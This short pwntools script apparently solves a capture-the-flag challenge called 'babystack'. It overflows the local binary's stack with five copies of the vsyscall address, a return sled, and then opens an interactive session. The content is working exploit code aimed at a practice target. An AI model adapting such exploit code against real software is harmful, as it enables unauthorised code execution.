from pwn import *
p=process('./babystack')
p.sendline(p64(0xffffffffff600000)*5)
p.interactive()
